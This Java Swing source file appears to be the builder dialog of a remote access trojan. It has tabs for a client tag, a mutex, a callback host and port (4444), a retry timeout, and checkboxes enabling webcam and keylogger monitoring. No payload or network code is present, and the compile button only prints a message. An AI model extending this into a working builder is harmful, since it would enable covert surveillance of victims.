package GUI.Compiler;

import com.formdev.flatlaf.FlatDarkLaf;

import javax.swing.*;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import java.awt.*;
import java.awt.event.FocusEvent;
import java.awt.event.FocusListener;

public class CompilerGUI {
    JTabbedPane tabPane;
    JDialog dialog;
    private final GridBagConstraints constraints = new GridBagConstraints();

    public CompilerGUI() {
        dialog = new JDialog();
        dialog.setModal(true);
        dialog.setSize(450, 275);
        dialog.setLocationRelativeTo(null);
        dialog.setLayout(new GridBagLayout());
        addTabbedPane();
        addLowerPanel();
        dialog.setVisible(true);

    }

    private void addTabbedPane() {
        tabPane = new JTabbedPane();
        addIdentificationPanel();
        addInstallationPanel();
        addMonitorPanel();
        addAssemblyPanel();
        addCompilePanel();
        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 1;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.BOTH;
        constraints.weighty = 1.0;
        constraints.weightx = 1.0;
        dialog.add(tabPane, constraints);
    }

    private void addLowerPanel() {
        Cursor handCursor = new Cursor(Cursor.HAND_CURSOR);
        JPanel lowerPanel = new JPanel();
        lowerPanel.setBackground(new Color(57, 60, 62));
        lowerPanel.setLayout(new FlowLayout(FlowLayout.RIGHT));
        JButton goBackButton = new JButton("< Back ");
        goBackButton.setVisible(false);
        goBackButton.setBackground(new Color(26, 33, 42));
        goBackButton.addActionListener(e -> tabPane.setSelectedIndex(tabPane.getSelectedIndex() - 1));
        lowerPanel.add(goBackButton);
        JButton compileButton = new JButton("Compile");
        compileButton.setVisible(false);
        compileButton.setCursor(handCursor);
        compileButton.setBackground(new Color(0, 136, 6));
        compileButton.addActionListener(e -> System.out.println("Start compiling"));
        lowerPanel.add(compileButton);

        JButton nextButton = new JButton("Next >");
        nextButton.setCursor(handCursor);
        nextButton.setBackground(new Color(23, 32, 42));
        nextButton.addActionListener(e -> tabPane.setSelectedIndex(tabPane.getSelectedIndex() + 1));
        lowerPanel.add(nextButton);
        tabPane.addChangeListener(e -> {
            switch (tabPane.getSelectedIndex()) {
                case 0 -> {
                    compileButton.setVisible(false);
                    goBackButton.setVisible(false);
                    nextButton.setVisible(true);
                }
                case 1, 2, 3 -> {
                    goBackButton.setVisible(true);
                    nextButton.setVisible(true);
                    compileButton.setVisible(false);
                }
                case 4 -> {
                    nextButton.setVisible(false);
                    compileButton.setVisible(true);
                }
            }
        });
        constraints.gridx = 0;
        constraints.gridy = 1;
        constraints.gridwidth = 1;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.HORIZONTAL;
        constraints.weighty = 0.0;
        dialog.add(lowerPanel, constraints);
    }

    private void addCompilePanel() {
        JPanel compilePanel = new JPanel();
        compilePanel.setLayout(null);

        JLabel tagLabel = new JLabel("Compile spec:");
        tagLabel.setBounds(10, 10, 210, 20);
        compilePanel.add(tagLabel);
        tabPane.add(compilePanel, "Compile");
    }


    private void addAssemblyPanel() {
        JPanel assemblyPanel = new JPanel();
        assemblyPanel.setLayout(null);

        JLabel tagLabel = new JLabel("Assembly spec:");
        tagLabel.setBounds(10, 10, 210, 20);
        assemblyPanel.add(tagLabel);
        tabPane.add(assemblyPanel, "Assembly");


    }


    private void addMonitorPanel() {
        JPanel monitorPanel = new JPanel();
        monitorPanel.setLayout(null);

        JCheckBox webcamCheckBox = new JCheckBox("Enable webcam monitoring");
        webcamCheckBox.setBounds(10, 10, 210, 20);
        monitorPanel.add(webcamCheckBox);

        JCheckBox keyloggerCheckBox = new JCheckBox("Enable keylogger monitoring");
        keyloggerCheckBox.setBounds(10, 40, 210, 20);
        monitorPanel.add(keyloggerCheckBox);


        JSeparator lastHorizontalSeparator = new JSeparator();
        lastHorizontalSeparator.setBounds(0, 170, 400, 5);
        monitorPanel.add(lastHorizontalSeparator);

        tabPane.add(monitorPanel, "Monitoring");
    }

    private void addInstallationPanel() {
        JPanel installationPanel = new JPanel();
        installationPanel.setLayout(null);

        JLabel tagLabel = new JLabel("Installation spec:");
        tagLabel.setBounds(10, 10, 210, 20);
        installationPanel.add(tagLabel);
        tabPane.add(installationPanel, "Installation");


    }

    private void addIdentificationPanel() {

        JPanel identificationPanel = new JPanel();

        identificationPanel.setLayout(null);


        JLabel tagLabel = new JLabel("Client tag for connection identification:");
        tagLabel.setBounds(10, 10, 210, 20);
        identificationPanel.add(tagLabel);
        JTextField tagField = new JTextField("Client 1");
        tagField.setBounds(225, 11, 125, 20);
        tagField.addFocusListener(new FocusListener() {
            public void focusGained(FocusEvent e) {
                if (tagField.getText().equals("Client 1")) {
                    tagField.setText("");
                }
            }

            public void focusLost(FocusEvent e) {
                if (tagField.getText().equals("")) {
                    tagField.setText("Client 1");
                }
            }
        });
        identificationPanel.add(tagField);

        JSeparator horizontal = new JSeparator();
        horizontal.setBounds(5, 100, 375, 5);
        horizontal.setOrientation(SwingConstants.HORIZONTAL);
        identificationPanel.add(horizontal);

        JLabel mutexLabel = new JLabel("Mutex is used to avoid executing the same client multiple times.");
        mutexLabel.setBounds(10, 40, 400, 20);
        identificationPanel.add(mutexLabel);
        JTextField mutexField = new JTextField(Mutex.generateMutex());
        mutexField.setBounds(10, 70, 240, 20);
        identificationPanel.add(mutexField);

        JButton mutexButton = new JButton("Generate");
        mutexButton.setBounds(260, 70, 90, 20);
        mutexButton.addActionListener(e -> mutexField.setText(Mutex.generateMutex()));
        identificationPanel.add(mutexButton);

        JLabel ipLabel = new JLabel("IP/Hostname:");
        ipLabel.setBounds(10, 110, 100, 20);
        identificationPanel.add(ipLabel);
        JTextField ipField = new JTextField("127.0.0.1");
        ipField.setBounds(90, 110, 100, 20);
        identificationPanel.add(ipField);


        JLabel portLabel = new JLabel("PORT:");
        portLabel.setBounds(50, 140, 50, 20);
        identificationPanel.add(portLabel);
        JTextField portField = new JTextField("4444");
        portField.setBounds(90, 140, 50, 20);
        identificationPanel.add(portField);

        JSeparator vertical = new JSeparator();
        vertical.setBounds(200, 106, 10, 60);
        vertical.setOrientation(SwingConstants.VERTICAL);
        identificationPanel.add(vertical);


        JLabel timingLabel = new JLabel("Timeout to retry connection:");
        timingLabel.setBounds(210, 110, 250, 20);
        identificationPanel.add(timingLabel);
        JTextField timingField = new JTextField("10000");
        timingField.setBounds(212, 140, 80, 20);
        identificationPanel.add(timingField);
        JLabel uniteLabel = new JLabel("ms");
        uniteLabel.setBounds(295, 140, 30, 20);
        identificationPanel.add(uniteLabel);


        tabPane.addTab("Identification", identificationPanel);
    }


    public static void main(String[] args) throws UnsupportedLookAndFeelException {
        UIManager.setLookAndFeel(new FlatDarkLaf());
        new CompilerGUI();
    }
}
